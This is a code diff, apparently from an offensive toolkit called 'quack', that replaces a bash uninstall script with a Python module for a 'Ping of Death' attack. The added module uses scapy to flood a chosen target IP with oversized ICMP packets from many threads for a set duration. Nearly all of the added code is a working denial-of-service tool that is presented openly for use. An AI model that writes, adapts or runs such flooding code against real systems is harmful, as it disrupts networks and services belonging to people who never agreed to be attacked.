@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/usr/bin/env python3
 
 # MIT License
 #
@@ -22,31 +22,46 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-N="\033[1;37m"
-C="\033[0m"
+import random
+import time
+from scapy.all import IP, ICMP, sendp, send, fragment, conf
+from threading import Thread
+# Import modules for POD flood
+import tools.randomData as randomData
 
-CE="\033[0m"
-RS="\033[1;31m"
-YS="\033[1;33m"
-BS="\033[1;34m"
-GNS="\033[1;32m"
+def POD_ATTACK(threads, attack_time, target):
+	# Finish
+	global FINISH
+	FINISH = False
 
-R="\033[1;31m"
-WS="\033[0m"
+	target_ip = target
 
-printf '\033]2;uninstall.sh\a'
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting POD attack...")
+	
+	threads_list = []
 
-if [[ $EUID -ne 0 ]]
-then
-   sleep 1
-   echo -e ""$RS"[-] "$WHS"This script must be run as root!"$CE"" 1>&2
-   sleep 1
-   exit
-fi
+	# POD flood
+	def pod_flood():
+		global FINISH
+		payload = random.choice(list("1234567890qwertyuiopasdfghjklzxcvbnm")) * 60000
+		packet  = IP(dst = target_ip) / ICMP(id = 65535, seq = 65535) / payload
 
-{
-rm /bin/quack
-rm /usr/local/bin/quack
-rm -rf ~/quack
-rm /data/data/com.termux/files/usr/bin/quack
-} &> /dev/null
+		while not FINISH:
+			for i in range(16):
+				send(packet, verbose = False)
+				print("\033[1;32m"+"[+]"+"\033[0m"+" Packet was sent!")
+
+	# Start threads
+	for thread in range(0, threads):
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread) + "...")
+		t = Thread(target = pod_flood)
+		t.start()
+		threads_list.append(t)
+	# Sleep selected secounds
+	time.sleep(attack_time)
+	# Terminate threads
+	for thread in threads_list:
+		FINISH = True
+		thread.join()
+	
+	print("\033[1;33m"+"[!]"+"\033[0m"+" POD attack stopped.")
